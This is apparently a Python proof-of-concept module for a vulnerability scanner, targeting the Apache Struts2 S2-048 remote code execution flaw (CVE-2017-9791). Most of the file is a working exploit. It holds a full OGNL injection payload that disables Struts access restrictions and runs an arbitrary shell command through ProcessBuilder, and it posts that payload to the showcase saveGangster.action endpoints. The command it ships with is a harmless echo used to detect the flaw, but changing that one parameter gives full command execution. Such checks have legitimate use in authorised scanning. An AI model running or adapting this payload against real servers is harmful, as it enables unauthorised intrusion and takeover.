# -*- coding: utf-8 -*-
# @Time   : 2018/4/15 上午1:01
# @author : Xmchx
# @File   : s2_048.py

from collections import OrderedDict
from kunscanner.lib.utils.utils import AddScheme, RandomString
import httplib
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
import requests
import socket
from kunscanner.lib.core.exception import PocWarningException
from kunscanner.lib.core.enums import SCRIPT_LEVEL

def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "s2_048"
    poc_info['info'] = "struts2-048 remote code execution (CVE-2017-9791)"
    poc_info['title'] = u"Struts2-048远程代码执行"
    poc_info['author'] = "Xmchx"
    poc_info['time'] = "2018.04.15"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info



def Poc(url):
    init_url = url
    result = {}
    result['success'] = False
    result['message'] = ''

    try:
        socket.setdefaulttimeout(5)
        random_str = RandomString()
        url = AddScheme(url)
        payload = {
            'name':'''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=#parameters.cmd[0]).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''',
            'age': '1',
            '__checkbox_bustedBefore': 'true',
            'description': '1',
            'cmd':'echo '+random_str
        }
        r = requests.post(url+'/struts2-showcase/integration/saveGangster.action', data=payload, timeout=5)
        if random_str in r.text and 'html' not in r.text:
            result['message'] = url+'/struts2-showcase/integration/saveGangster.action'
            result['success'] = True
        r = requests.post(url + '/integration/saveGangster.action', data=payload, timeout=5)
        if random_str in r.text and 'html' not in r.text:
            result['message'] = url + '/integration/saveGangster.action'
            result['success'] = True
        return result
    except Exception,e:
        raise PocWarningException(init_url,Info()['name'],repr(e))
